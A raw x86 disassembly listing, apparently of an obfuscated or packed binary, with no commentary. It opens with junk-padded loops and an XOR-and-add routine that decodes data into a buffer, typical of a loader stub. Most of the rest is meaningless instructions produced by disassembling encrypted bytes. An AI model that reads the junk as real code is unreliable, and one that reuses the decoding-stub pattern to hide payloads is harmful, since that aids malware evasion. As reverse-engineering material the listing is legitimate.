  4103a6:	call   DWORD PTR ds:0x412378
  4103ac:	cmp    DWORD PTR ds:0x433713,0xe
  4103b3:	jne    0x4103c8
  4103b9:	xor    ecx,ecx
  4103bb:	xor    ecx,DWORD PTR ds:0x433713
  4103c1:	inc    ecx
  4103c2:	mov    DWORD PTR ds:0x433713,ecx
  4103c8:	cmp    DWORD PTR ds:0x433713,0x1b
  4103cf:	jb     0x410382
  4103d5:	sub    DWORD PTR ds:0x43365f,edx
  4103db:	mov    ecx,0x7510854
  4103e0:	push   esi
  4103e1:	and    DWORD PTR ds:0x433657,0x0
  4103eb:	jmp    0x4103ff
  4103f0:	xor    esi,esi
  4103f2:	add    esi,DWORD PTR ds:0x433657
  4103f8:	inc    esi
  4103f9:	mov    DWORD PTR ds:0x433657,esi
  4103ff:	cmp    DWORD PTR ds:0x433657,0x1d
  410406:	jae    0x410427
  41040c:	cmp    DWORD PTR ds:0x433657,0x26
  410413:	jne    0x410422
  410419:	push   DWORD PTR [ebp-0x24]
  41041c:	call   DWORD PTR ds:0x4122b4
  410422:	jmp    0x4103f0
  410427:	xor    eax,ecx
  410429:	mov    esi,0x32729b
  41042e:	add    eax,esi
  410430:	jmp    0x41043d
  410435:	mov    dl,BYTE PTR [ebp-0x1]
  410438:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  41043c:	inc    eax
  41043d:	cmp    eax,0x40
  410440:	jb     0x410435
  410446:	mov    edx,DWORD PTR [ebp-0x8]
  410449:	mov    eax,DWORD PTR [ebp-0xc]
  41044c:	xor    edx,ecx
  41044e:	add    edx,esi
  410450:	cmp    edx,eax
  410452:	je     0x410766
  410458:	push   ebx
  410459:	push   edi
  41045a:	mov    edi,DWORD PTR [ebp+0x8]
  41045d:	mov    eax,0x8a3c
  410462:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410467:	mov    edi,0x3b02
  41046c:	add    ax,di
  41046f:	movzx  eax,ax
  410472:	mov    DWORD PTR [ebp-0x14],eax
  410475:	mov    eax,DWORD PTR [ebp+0x8]
  410478:	movzx  eax,WORD PTR [eax+edx*4]
  41047c:	xor    eax,0x8a3c
  410481:	add    eax,edi
  410483:	mov    edi,DWORD PTR [ebp-0x14]
  410486:	mov    BYTE PTR [ebp+edi*1-0x58],al
  41048a:	jmp    0x410758
  41048f:	cdq    
  410490:	outs   dx,BYTE PTR ds:[esi]
  410491:	mov    ds:0xa1f17118,eax
  410496:	outs   dx,DWORD PTR ds:[esi]
  410497:	or     BYTE PTR [edx],bl
  410499:	push   es
  41049a:	out    0xa0,al
  41049c:	xchg   esi,eax
  41049d:	fwait
  41049e:	adc    esp,ebx
  4104a0:	mov    al,0x7e
  4104a2:	jle    0x410453
  4104a4:	jl     0x410524
  4104a6:	jle    0x410517
  4104a8:	fisub  WORD PTR [ebp+eiz*2-0x47]
  4104ac:	in     eax,dx
  4104ad:	out    0x58,eax
  4104af:	inc    ebx
  4104b0:	ret    
  4104b1:	cmp    ch,BYTE PTR ds:0x4f44a168
  4104b7:	mov    ?,WORD PTR [edx+esi*4]
  4104ba:	sub    cl,BYTE PTR [edi]
  4104bc:	jecxz  0x4104bb
  4104be:	cmp    DWORD PTR ds:0xeb1312ef,esp
  4104c4:	arpl   WORD PTR [bx+di],dx
  4104c7:	repz dec esi
  4104c9:	push   ss
  4104ca:	inc    ecx
  4104cb:	scas   al,BYTE PTR es:[edi]
  4104cc:	mov    ds,WORD PTR [edx-0x14414975]
  4104d2:	pusha  
  4104d3:	pop    eax
  4104d4:	sahf   
  4104d5:	mov    BYTE PTR [esi+0x29179473],ch
  4104db:	ss add eax,0xeb35ca2d
  4104e1:	outs   dx,DWORD PTR ds:[esi]
  4104e2:	mov    esp,0xcff9f266
  4104e7:	add    ah,BYTE PTR [ebp+0x15]
  4104ea:	retf   0x5054
  4104ed:	adc    ch,bh
  4104ef:	jecxz  0x410542
  4104f1:	and    BYTE PTR [esp+edi*4+0x74e06ac0],ch
  4104f8:	aaa    
  4104f9:	lds    ebx,FWORD PTR [ecx-0x4fb862f1]
  4104ff:	rcl    DWORD PTR [eax+0x9],cl
  410502:	push   esp
  410503:	add    eax,0xe850b3e7
  410508:	ins    DWORD PTR es:[edi],dx
  410509:	shl    BYTE PTR ds:0xdb51ef7d,1
  41050f:	mov    eax,0x8f95ed23
  410514:	fcmovnu st,st(2)
  410516:	rcl    ecx,1
  410518:	ja     0x4104ae
  41051a:	(bad)  
  41051b:	cmc    
  41051c:	mov    edi,0xb4560a85
  410521:	dec    ebp
  410522:	out    0x21,al
  410524:	iret   
  410525:	ret    0xfaea
  410528:	xor    al,0xf9
  41052a:	xchg   edi,eax
  41052b:	stc    
  41052c:	fdiv   QWORD PTR ds:0xd6b1d426
  410532:	dec    edi
  410533:	dec    edi
  410534:	cmp    ebp,DWORD PTR [ecx]
  410536:	xchg   esi,eax
  410537:	pushf  
  410538:	imul   eax,DWORD PTR [ebx+0x7754ecd6],0xb9d4281c
  410542:	aaa    
  410543:	lea    eax,[edi+0x59]
  410546:	jp     0x410575
  410548:	aas    
  410549:	xor    DWORD PTR [edx+edx*4+0x27],0x2e
  41054e:	xchg   ebx,eax
  41054f:	fwait
  410550:	stos   DWORD PTR es:[edi],eax
  410551:	jge    0x41052e
  410553:	push   edi
  410554:	dec    ebx
  410555:	jae    0x4104db
  410557:	in     al,0xb0
  410559:	cdq    
  41055a:	mov    bh,0xc5
  41055c:	pusha  
  41055d:	shl    BYTE PTR [eax],0x77
  410560:	mov    bl,0x6b
  410562:	xor    DWORD PTR [ebp+0x6e],esp
  410565:	mov    bl,0x99
  410567:	pop    ebp
  410568:	clc    
  410569:	lea    ebx,[ecx-0x7e4cdf37]
  41056f:	inc    edx
  410570:	adc    eax,0x2028d255
  410575:	call   0x20d2:0x782ed15
  41057c:	add    ecx,DWORD PTR [ebx+eax*8]
  41057f:	test   BYTE PTR [edi+0x1abbbe43],cl
  410585:	gs hlt 
  410587:	mov    eax,0x794eae9a
  41058c:	mov    WORD PTR [esp+ebp*2+0x7],es
  410590:	loope  0x41058b
  410592:	mov    edi,DWORD PTR [ebp-0x27]
  410595:	jne    0x41054c
  410597:	lds    ecx,FWORD PTR [ebx-0x1d]
  41059a:	ficom  DWORD PTR [eax-0x2]
  41059d:	adc    BYTE PTR [eax],cl
  41059f:	push   0x5ed06676
  4105a4:	int3   
  4105a5:	ins    BYTE PTR es:[edi],dx
  4105a6:	sbb    BYTE PTR [ecx+ebx*8+0x53],0x3e
  4105ab:	in     al,0xa8
  4105ad:	cmp    DWORD PTR [ecx],ebp
  4105af:	repnz and BYTE PTR [ebx+edx*1],0xa8
  4105b4:	sub    eax,0x1533fefe
  4105b9:	sub    BYTE PTR [ebp+0x79],0x52
  4105bd:	and    eax,0x9bf0a870
  4105c2:	jp     0x4105ba
  4105c4:	mov    edi,0x9ff1b9eb
  4105c9:	je     0x41062f
  4105cb:	(bad)  
  4105cc:	lahf   
  4105cd:	sub    eax,0x2c5c1945
  4105d2:	xchg   DWORD PTR [edi+0x25a1f1c1],ecx
  4105d8:	add    DWORD PTR [esi-0x489e99ad],edi
  4105de:	jp     0x41061c
  4105e0:	out    dx,al
  4105e1:	cs pushf 
  4105e3:	push   0xde03a200
  4105e8:	xchg   edi,eax
  4105e9:	xchg   BYTE PTR ds:0xefe40c94,ch
  4105ef:	in     eax,0x63
  4105f1:	repnz adc esp,DWORD PTR [ebx]
  4105f4:	rcr    esp,cl
  4105f6:	lahf   
  4105f7:	stc    
  4105f8:	jecxz  0x41066b
  4105fa:	add    al,0x9a
  4105fc:	es xor al,bl
  4105ff:	mov    eax,DWORD PTR [esi-0x72ae867d]
  410605:	imul   DWORD PTR [ebp-0x61480ff1]
  41060b:	mov    ds:0x63e3e382,eax
  410610:	and    eax,ecx
  410612:	cmp    ch,BYTE PTR [ebx+edi*4]
  410615:	out    0x61,al
  410617:	jecxz  0x41068f
  410619:	inc    ecx
  41061b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41061c:	retf   0xe6e2
  41061f:	push   edx
  410620:	and    BYTE PTR [ebx+0x1f],cl
  410623:	jno    0x410629
  410625:	addr16 cs dec esi
  410628:	mov    ecx,0x938045ac
  41062d:	and    BYTE PTR [ecx+ebx*8],ch
  410630:	popa   
  410631:	inc    ebp
  410632:	push   cs
  410633:	mov    esi,0x40f772ec
  410638:	ror    edx,1
  41063a:	pop    esi
  41063b:	add    BYTE PTR [edx],0xcc
  41063e:	mov    ah,0x7d
  410640:	push   ebx
  410641:	inc    ebx
  410642:	push   ecx
  410643:	mov    eax,ds:0x96161406
  410648:	or     al,0x54
  41064a:	into   
  41064b:	fmul   DWORD PTR [ebx-0x51203536]
  410651:	retf   
  410652:	pop    ds
  410653:	jl     0x410679
  410655:	add    BYTE PTR [esp+esi*4],bh
  410658:	cmp    cl,BYTE PTR [esi]
  41065a:	jnp    0x41062c
  41065c:	sbb    DWORD PTR [ebx+0x14],0x787c9bec
  410663:	popf   
  410664:	jg     0x410610
  410666:	aaa    
  410667:	outs   dx,BYTE PTR ds:[esi]
  410668:	push   edx
  410669:	pop    ecx
  41066a:	rol    DWORD PTR ds:0xc6bd9b3,cl
  410670:	mov    eax,0xcdee9d45
  410675:	shl    BYTE PTR [edx-0x23],1
  410678:	mov    al,0xc1
  41067a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41067b:	nop
  41067c:	popf   
  41067d:	in     al,0x43
  41067f:	in     al,dx
  410680:	add    eax,DWORD PTR [edx-0x4566023b]
  410686:	aam    0x1d
  410688:	adc    ebx,esi
  41068a:	sar    BYTE PTR [ecx],1
  41068c:	mul    BYTE PTR [edi-0x7800f020]
  410692:	popa   
  410693:	das    
  410694:	lahf   
  410695:	inc    ebp
  410696:	ins    BYTE PTR es:[edi],dx
  410697:	jl     0x410674
  410699:	test   eax,0x9e01f8c3
  41069e:	mov    ecx,0x841cc900
  4106a3:	cli    
  4106a4:	jno    0x410683
  4106a6:	xchg   ebp,eax
  4106a7:	xchg   ecx,eax
  4106a8:	xchg   ebp,eax
  4106a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106aa:	aam    0x83
  4106ac:	data16 sub BYTE PTR [edi],bl
  4106af:	jle    0x410727
  4106b1:	(bad)  
  4106b2:	arpl   WORD PTR [ebx+0x41ca254e],di
  4106b8:	inc    ebp
  4106b9:	arpl   WORD PTR [esi+0x79],sp
  4106bc:	pop    eax
  4106bd:	scas   al,BYTE PTR es:[edi]
  4106be:	jo     0x4106e7
  4106c0:	xor    BYTE PTR cs:[ecx+0x3a],0x73
  4106c5:	sahf   
  4106c6:	cmp    edi,DWORD PTR [edi]
  4106c8:	iret   
  4106c9:	arpl   WORD PTR [eax],cx
  4106cb:	cmp    edx,DWORD PTR [edx-0x2755f3ff]
  4106d1:	in     eax,dx
  4106d2:	pop    edi
  4106d3:	pop    esi
  4106d4:	ss hlt 
  4106d6:	cdq    
  4106d7:	aad    0x7b
  4106d9:	pop    esi
  4106da:	test   eax,0x76675a5c
  4106df:	lock or esp,esi
  4106e2:	sbb    BYTE PTR [esi+0x4],ch
  4106e5:	dec    ecx
  4106e6:	stos   DWORD PTR es:[edi],eax
  4106e7:	adc    DWORD PTR [ebx],esi
  4106e9:	mov    ebx,0x39a4d974
  4106ee:	cmp    edi,eax
  4106f0:	sbb    dl,bl
  4106f2:	stos   BYTE PTR es:[edi],al
  4106f3:	loope  0x410746
  4106f5:	mov    edi,0xb4874d87
  4106fa:	ja     0x41071d
  4106fc:	outs   dx,BYTE PTR ds:[esi]
  4106fd:	loopne 0x410701
  4106ff:	add    eax,0x529b4cf0
  410704:	fcom   DWORD PTR [ecx+esi*8+0x692f2d2f]
  41070b:	ret    
  41070c:	or     DWORD PTR [eax],ecx
  41070e:	hlt    
  41070f:	add    BYTE PTR [ebx+edi*8],ah
  410712:	or     edx,esp
  410714:	push   ds
  410715:	and    DWORD PTR [eax-0x3cc6d3e1],ebx
  41071b:	pop    eax
  41071c:	sahf   
  41071d:	jno    0x4106d9
  41071f:	ins    DWORD PTR es:[edi],dx
  410720:	and    edx,DWORD PTR [ecx+0x41]
  410723:	ret    
  410724:	mov    DWORD PTR [ebp+eax*1+0x7cc7bf88],edx
  41072b:	out    0x7c,eax
  41072d:	out    0x1,eax
  41072f:	ret    
  410730:	imul   edi,DWORD PTR [esi-0x5d],0x22
  410734:	aad    0x1
  410736:	in     al,0xdc
  410738:	pop    edx
  410739:	add    ah,BYTE PTR ds:0xa567951a
  41073f:	lock mov edx,0x84cfc3da
  410745:	cvtpi2ps xmm5,QWORD PTR [edi-0x3d7af2cb]
  41074c:	inc    ebp
  41074d:	dec    ecx
  41074e:	xchg   ebx,eax
  41074f:	mov    ecx,0x943f1896
  410754:	scas   al,BYTE PTR es:[edi]
  410755:	mov    cl,0x3f
  410757:	fimul  WORD PTR [ebx+0x3b42f445]
  41075d:	ror    BYTE PTR [edi],1
  41075f:	test   esi,esi
  410761:	cld    
  410762:	(bad)  
  410763:	call   FWORD PTR [edi+0x5b]
  410766:	mov    eax,DWORD PTR [ebp-0x8]
  410769:	mov    edx,DWORD PTR [ebp+0x10]
  41076c:	xor    eax,ecx
  41076e:	jmp    0x410a3c
  410773:	mov    ds:0x6929ab51,eax
  410778:	icebp  
  410779:	mov    eax,ds:0x2251d751
  41077e:	and    eax,0x15c16d02
  410783:	or     eax,0xaf7e7ebf
  410788:	jl     0x410808
  41078a:	jle    0x4107e7
  41078c:	dec    eax
  41078d:	cmovp  ecx,eax
  410790:	jle    0x41072b
  410792:	loop   0x4107e1
  410794:	mov    dl,0x66
  410796:	ret    0x8d0b
  410799:	das    
  41079a:	fisubr DWORD PTR [edx]
  41079c:	push   ss
  41079d:	jb     0x41080b
  41079f:	sbb    DWORD PTR [ecx-0x43],eax
  4107a2:	mov    bh,0xf1
  4107a4:	in     al,dx
  4107a5:	lds    esi,FWORD PTR [ebx]
  4107a7:	xor    eax,0xa084b26c
  4107ac:	jecxz  0x410817
  4107ae:	cmp    eax,ebp
  4107b0:	js     0x410814
  4107b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107b3:	or     al,0xd2
  4107b5:	int3   
  4107b6:	mov    edx,0x9e5212e9
  4107bb:	shl    DWORD PTR [esi-0xd],1
  4107be:	xor    DWORD PTR ds:0x8249d910,ebp
  4107c4:	stos   DWORD PTR es:[edi],eax
  4107c5:	das    
  4107c6:	test   eax,0xd7d9dd38
  4107cb:	mov    bh,BYTE PTR [ebx]
  4107cd:	mov    ah,0x84
  4107cf:	jbe    0x410807
  4107d1:	push   ebx
  4107d2:	or     ah,BYTE PTR [edx+0x942ce0c]
  4107d8:	pop    edx
  4107d9:	popf   
  4107da:	and    DWORD PTR [ebp-0x656850d7],0x42
  4107e1:	enter  0x670b,0x63
  4107e5:	inc    esi
  4107e6:	fbld   TBYTE PTR [edx]
  4107e8:	push   0x236801e0
  4107ed:	and    eax,0x5b2ae78
  4107f2:	mov    edi,0xec96dc9a
  4107f7:	rcr    BYTE PTR [esi],1
  4107f9:	retf   
  4107fa:	add    eax,0x719808ef
  4107ff:	sbb    eax,0xacbfab19
  410804:	and    edx,esi
  410806:	mov    al,0xeb
  410808:	mov    bh,0xb1
  41080a:	cwde   
  41080b:	push   0x850af901
  410810:	js     0x410806
  410812:	sbb    al,0x55
  410814:	jecxz  0x41085f
  410816:	je     0x41085b
  410818:	jmp    0x410852
  41081a:	fiadd  DWORD PTR [ecx-0x1f]
  41081d:	imul   ebx,DWORD PTR [edx],0x39
  410820:	cld    
  410821:	retf   0xb3ac
  410824:	shl    DWORD PTR [eax+0x6ef179e4],cl
  41082a:	mov    ebp,0xfc3d47e0
  41082f:	jmp    0x53c5:0x34a438e4
  410836:	adc    esi,DWORD PTR [ecx+0x1b8367c5]
  41083c:	pop    esi
  41083d:	sub    eax,0x76ca4ae0
  410842:	dec    edx
  410843:	mov    al,0xd7
  410845:	call   0xa4f49cfd
  41084a:	in     eax,0x5d
  41084c:	imul   edx,eax,0x893091dc
  410852:	fs cwde 
  410854:	add    BYTE PTR [esi],0x37
  410857:	ror    esi,cl
  410859:	cmp    esp,edi
  41085b:	repnz xchg edi,eax
  41085d:	rcr    DWORD PTR [ebx],1
  41085f:	sti    
  410860:	ror    BYTE PTR [eax-0x20],cl
  410863:	push   ss
  410864:	pop    ss
  410865:	outs   dx,DWORD PTR ds:[esi]
  410866:	test   DWORD PTR ds:0x3a694b1c,edi
  41086c:	sbb    ch,BYTE PTR [ebx+0x23]
  41086f:	fs jne 0x410861
  410872:	lods   eax,DWORD PTR ds:[esi]
  410873:	icebp  
  410874:	push   0x379620ce
  410879:	mov    bl,0xb8
  41087b:	xor    al,0x7b
  41087d:	sub    eax,0x9dc045ff
  410882:	loopne 0x4108df
  410884:	sub    al,BYTE PTR [eax-0x7f945542]
  41088a:	sub    ax,0x8c2a
  41088e:	sub    BYTE PTR [ebp+0x3c],dl
  410891:	ds loop 0x410856
  410894:	fld    TBYTE PTR [eax+0xdc72aeb]
  41089a:	push   es
  41089b:	ret    
  41089c:	mov    ebx,0xeee7fcf7
  4108a1:	dec    esp
  4108a2:	mov    cl,0x91
  4108a4:	int3   
  4108a5:	cmp    dl,BYTE PTR [esi+0x42]
  4108a8:	push   esi
  4108a9:	xor    al,0x92
  4108ab:	xchg   ah,bl
  4108ad:	and    dh,BYTE PTR [edx]
  4108af:	push   ebx
  4108b0:	cld    
  4108b1:	nop
  4108b2:	int    0x4d
  4108b4:	mov    BYTE PTR [edi+0x123f9b64],al
  4108ba:	bound  esi,QWORD PTR [esi-0x6d]
  4108bd:	loop   0x410914
  4108bf:	jnp    0x4108ae
  4108c1:	xchg   ebp,eax
  4108c2:	daa    
  4108c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108c4:	pop    esi
  4108c5:	stc    
  4108c6:	in     eax,dx
  4108c7:	and    dl,ah
  4108c9:	ret    
  4108ca:	fild   QWORD PTR [ecx-0x6b]
  4108cd:	jo     0x4108de
  4108cf:	(bad)  
  4108d0:	ss ja  0x41087c
  4108d3:	dec    edi
  4108d4:	shr    DWORD PTR [eax-0x4d],0xd2
  4108d8:	mov    dh,0xf
  4108da:	(bad)  
  4108db:	pop    ds
  4108dc:	test   ax,0xe355
  4108e0:	mov    bh,0xb
  4108e2:	pop    edi
  4108e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108e4:	and    DWORD PTR [eax-0x60],edx
  4108e7:	dec    ecx
  4108e8:	addr16 pop es
  4108ea:	xor    eax,0xfef99f5
  4108ef:	pop    ebp
  4108f0:	dec    edx
  4108f1:	jbe    0x4108cb
  4108f3:	jl     0x4108e3
  4108f5:	out    dx,eax
  4108f6:	cmp    DWORD PTR [eax],edi
  4108f8:	faddp  st(2),st
  4108fa:	cli    
  4108fb:	cmp    BYTE PTR [ebx],al
  4108fd:	or     BYTE PTR [edx-0x11],al
  410900:	test   al,0x92
  410902:	test   BYTE PTR [edx+eiz*2-0x44],al
  410906:	scas   eax,DWORD PTR es:[edi]
  410907:	push   es
  410908:	ins    BYTE PTR es:[edi],dx
  410909:	fimul  DWORD PTR [ecx-0x43]
  41090c:	push   cs
  41090d:	mov    cl,0x53
  41090f:	xchg   ecx,eax
  410910:	push   edx
  410911:	packsswb mm3,QWORD PTR [edx+0x108d52d5]
  410918:	pop    edx
  410919:	jecxz  0x41090b
  41091b:	sahf   
  41091c:	jmp    0x4108dd
  41091e:	mov    dh,0xab
  410920:	jp     0x410948
  410922:	(bad)  
  410923:	jo     0x4108df
  410925:	test   BYTE PTR [ebx],0x3b
  410928:	sahf   
  410929:	ret    
  41092a:	sub    BYTE PTR [eax+0x2f],dh
  41092d:	dec    edi
  41092e:	inc    esi
  41092f:	cmp    dl,BYTE PTR [ebx+ecx*2]
  410932:	mov    edi,0x8d456a68
  410937:	sar    BYTE PTR [ecx+0x706f4ee],cl
  41093d:	rol    DWORD PTR [ecx],cl
  41093f:	pop    DWORD PTR [ebx+ecx*2+0x3c]
  410943:	ins    BYTE PTR es:[edi],dx
  410944:	gs ret 
  410946:	jne    0x410959
  410948:	inc    ecx
  410949:	dec    eax
  41094a:	mov    bl,BYTE PTR [ebx]
  41094c:	stc    
  41094d:	gs or  eax,0xa6fb5cd
  410953:	cmc    
  410954:	test   BYTE PTR ds:0x7aa12bbe,dh
  41095a:	and    DWORD PTR [ecx],ecx
  41095c:	mov    cl,0xf7
  41095e:	mov    ch,0xa5
  410960:	out    0x9d,al
  410962:	jecxz  0x41094b
  410964:	xchg   esi,eax
  410965:	pop    esp
  410966:	into   
  410967:	cmp    BYTE PTR [ecx-0x3a],bh
  41096a:	call   0x2e3f:0x63f22449
  410971:	or     BYTE PTR [edx],0xbd
  410974:	int    0xe8
  410976:	sub    eax,0xa52c0ecb
  41097b:	mov    esp,0x556e7b43
  410980:	pusha  
  410981:	inc    ecx
  410982:	push   esp
  410983:	enter  0x4886,0xd4
  410987:	pop    ss
  410988:	sbb    BYTE PTR [ecx+0x27],ch
  41098b:	xchg   ch,bh
  41098d:	mov    edi,0x518ef4bb
  410992:	jle    0x4109e4
  410994:	jle    0x410a0a
  410996:	nop
  410997:	ret    
  410998:	adc    ch,BYTE PTR [edi+0x7b]
  41099b:	outs   dx,BYTE PTR ds:[esi]
  41099c:	jae    0x4109fe
  41099e:	add    ah,BYTE PTR cs:[edx+0x39]
  4109a2:	add    eax,0xb20cb221
  4109a7:	enter  0x7b45,0xf5
  4109ab:	lods   eax,DWORD PTR ds:[esi]
  4109ac:	xchg   ecx,eax
  4109ad:	or     BYTE PTR ds:0x15492a2c,bh
  4109b3:	jb     0x41094f
  4109b5:	ds pop ecx
  4109b7:	xchg   edi,eax
  4109b8:	add    dl,ch
  4109ba:	or     BYTE PTR [esi],bl
  4109bc:	xchg   edi,eax
  4109bd:	imul   ecx,DWORD PTR [ecx],0x6
  4109c0:	enter  0x2f5e,0x93
  4109c4:	mov    esp,0xc2ee4886
  4109c9:	outs   dx,DWORD PTR ds:[esi]
  4109ca:	push   eax
  4109cb:	inc    ecx
  4109cc:	dec    esp
  4109cd:	stos   BYTE PTR es:[edi],al
  4109ce:	dec    esi
  4109cf:	ret    
  4109d0:	jbe    0x41099f
  4109d2:	add    eax,0xb9b08a89
  4109d7:	aas    
  4109d8:	shr    DWORD PTR [ecx+edi*2],cl
  4109db:	std    
  4109dc:	imul   esi,DWORD PTR [ecx],0x49
  4109df:	imul   eax,DWORD PTR [ecx-0x4],0xfffffff0
  4109e3:	repz mov esp,0x4b64ccf9
  4109ea:	or     cl,ch
  4109ec:	jecxz  0x4109f9
  4109ee:	dec    esi
  4109ef:	add    dh,BYTE PTR [edx]
  4109f1:	inc    edx
  4109f2:	test   BYTE PTR [edi-0x4a130930],bl
  4109f8:	js     0x410a19
  4109fa:	push   ds
  4109fb:	inc    ebx
  4109fc:	or     dl,BYTE PTR [ebp+0x32]
  4109ff:	pop    ss
  410a00:	lods   eax,DWORD PTR ds:[esi]
  410a01:	xchg   edi,eax
  410a02:	ins    DWORD PTR es:[edi],dx
  410a03:	pop    edx
  410a04:	sub    DWORD PTR [ebx+0x64],eax
  410a07:	xchg   ebx,eax
  410a08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a09:	dec    ebp
  410a0a:	mov    eax,0x258c883b
  410a0f:	or     eax,0xa5d0619b
  410a14:	push   esp
  410a15:	push   0xe3f61c4c
  410a1a:	or     al,0xe6
  410a1c:	adc    eax,DWORD PTR [edi]
  410a1e:	enter  0xcabc,0x63
  410a22:	and    eax,0x2ea01a30
  410a27:	pop    edx
  410a28:	adc    esp,DWORD PTR [esp+edi*4]
  410a2b:	lods   eax,DWORD PTR ds:[esi]
  410a2c:	pop    ds
  410a2d:	stos   BYTE PTR es:[edi],al
  410a2e:	push   esp
  410a2f:	shl    BYTE PTR [edi+0x35],0x40
  410a33:	mov    esp,DWORD PTR [ecx]
  410a35:	stos   DWORD PTR es:[edi],eax
  410a36:	adc    ebx,ebx
  410a38:	hlt    
  410a39:	jmp    0xc644a2cf
  410a3e:	jmp    0x410d0c
  410a43:	add    dh,BYTE PTR [edx]
  410a45:	fdiv   QWORD PTR fs:[eax+ebp*2-0x7e]
  410a4a:	lock pop eax
  410a4c:	(bad)  
  410a4d:	xchg   esp,eax
  410a4e:	pop    esi
  410a4f:	push   eax
  410a50:	push   ecx
  410a51:	jns    0x410a25
  410a53:	mov    edx,0xaf7e7ebd
  410a58:	jl     0x410ad8
  410a5a:	jle    0x410ac4
  410a5c:	xor    DWORD PTR [ebx*2+0x3b07ebfa],ebp
  410a63:	sub    esi,edx
  410a65:	mov    al,ds:0xb577d77
  410a6a:	add    esp,DWORD PTR [eax]
  410a6c:	mov    al,ds:0x922b8607
  410a71:	inc    edi
  410a72:	mov    ebx,0xb583e913
  410a77:	test   al,0xcd
  410a79:	fwait
  410a7a:	test   DWORD PTR [esi+0x1f],esp
  410a7d:	ret    0xbdef
  410a80:	loope  0x410a8f
  410a82:	inc    ecx
  410a83:	push   ebp
  410a84:	add    edx,DWORD PTR [edx-0x79fb9217]
  410a8a:	adc    dl,ch
  410a8c:	xor    ebp,DWORD PTR [esi-0x44]
  410a8f:	push   esp
  410a90:	cmp    DWORD PTR [edx+0x4ff29777],0xf837fb40
  410a9a:	inc    ecx
  410a9b:	pop    ecx
  410a9c:	mov    bl,0x9b
  410a9e:	xchg   ebx,eax
  410a9f:	push   esp
  410aa0:	xchg   ecx,eax
  410aa1:	mov    dh,0xc6
  410aa3:	sub    bl,BYTE PTR [ecx+0x1d]
  410aa6:	out    dx,eax
  410aa7:	outs   dx,DWORD PTR ds:[esi]
  410aa8:	aam    0x34
  410aaa:	or     DWORD PTR [edx-0x59],0x47
  410aae:	adc    BYTE PTR [edx],al
  410ab0:	jle    0x410aae
  410ab2:	popf   
  410ab3:	fstp   QWORD PTR [ebx-0x45]
  410ab6:	adc    eax,esi
  410ab8:	das    
  410ab9:	xor    DWORD PTR [eax-0x44],ebx
  410abc:	fst    DWORD PTR [ebx]
  410abe:	jb     0x410af2
  410ac0:	cmp    eax,0x3be0ef61
  410ac5:	arpl   WORD PTR [ecx+esi*2],si
  410ac8:	out    dx,eax
  410ac9:	add    DWORD PTR [eax+0x385818d9],0x1f5d1175
  410ad3:	sub    dl,BYTE PTR [edi]
  410ad5:	add    edx,ebp
  410ad7:	xchg   ebp,eax
  410ad8:	and    eax,0xf238ba6a
  410add:	dec    eax
  410ade:	in     al,dx
  410adf:	mov    ebp,0x986d7f0c
  410ae4:	stos   DWORD PTR es:[edi],eax
  410ae5:	retf   0x9426
  410ae8:	out    0x78,eax
  410aea:	jp     0x410ac0
  410aec:	test   BYTE PTR [ebx],ah
  410aee:	and    al,0x25
  410af0:	(bad)  
  410af1:	in     eax,0x53
  410af3:	cmp    DWORD PTR [esi-0x525d7516],0x4fea9090
  410afd:	(bad)  
  410aff:	cs dec ebp
  410b01:	xor    BYTE PTR [ebp+0x62babc52],0x2a
  410b08:	enter  0x98fc,0x4a
  410b0c:	test   al,0x91
  410b0e:	(bad)  [esp+esi*8+0x14]
  410b12:	into   
  410b13:	test   eax,0xea40a06
  410b18:	ss push ebp
  410b1a:	out    dx,al
  410b1b:	aas    
  410b1c:	add    DWORD PTR [edi],0x5f
  410b1f:	inc    edx
  410b20:	mov    DWORD PTR [ebx+0xa],esp
  410b23:	mov    ebp,0x9a65d016
  410b28:	loopne 0x410b2e
  410b2a:	call   0xde636fab
  410b2f:	jne    0x410b9f
  410b31:	imul   ebp,DWORD PTR [esi-0x64a10120],0x63
  410b38:	sbb    al,0xa4
  410b3a:	pop    ss
  410b3b:	adc    eax,0xc2ee2c87
  410b40:	je     0x410b2f
  410b42:	mov    ds:0x6ba1f754,al
  410b47:	inc    ecx
  410b48:	fisttp QWORD PTR [ebx-0x3e]
  410b4b:	ret    0x1e0
  410b4e:	imul   ecx,DWORD PTR [ecx-0xe],0x96b3f39f
  410b55:	xchg   ebx,eax
  410b56:	daa    
  410b57:	(bad)  
  410b58:	imul   ebx,DWORD PTR [ecx+0x27],0x8e66dbc1
  410b5f:	(bad)  
  410b60:	xchg   ebp,eax
  410b61:	xor    DWORD PTR [edi+ebp*2-0x11],esp
  410b65:	mov    DWORD PTR [edi+eiz*1],esi
  410b68:	jb     0x410b79
  410b6a:	neg    ch
  410b6c:	or     al,0x71
  410b6e:	in     eax,dx
  410b6f:	adc    eax,0xf0e2c9a6
  410b74:	dec    ebp
  410b75:	xor    DWORD PTR [ecx+0x347a8931],ecx
  410b7b:	ja     0x410be4
  410b7d:	retf   0x4c60
  410b80:	pusha  
  410b81:	jnp    0x410b6f
  410b83:	pusha  
  410b84:	scas   eax,DWORD PTR es:[edi]
  410b85:	aas    
  410b86:	dec    eax
  410b87:	xchg   edi,eax
  410b88:	xchg   esi,eax
  410b89:	fdiv   QWORD PTR [eax]
  410b8b:	xchg   ebx,eax
  410b8c:	adc    edi,DWORD PTR [edx]
  410b8e:	scas   al,BYTE PTR es:[edi]
  410b8f:	scas   eax,DWORD PTR es:[edi]
  410b90:	lahf   
  410b91:	push   edi
  410b92:	jns    0x410c12
  410b94:	loope  0x410b7b
  410b96:	fcom   DWORD PTR [ebp-0x65]
  410b99:	push   0xebd2a5dc
  410b9e:	adc    eax,0xdad763d8
  410ba3:	bts    DWORD PTR [eax-0x44],edi
  410ba7:	mov    ebp,0x4fe38599
  410bac:	mov    dl,bh
  410bae:	xchg   ebp,eax
  410baf:	repnz adc eax,0x4714db06
  410bb5:	es push ebp
  410bb7:	push   ds
  410bb8:	bsr    edx,DWORD PTR [ebp+0x62c99f50]
  410bbf:	es push 0xd38d31ba
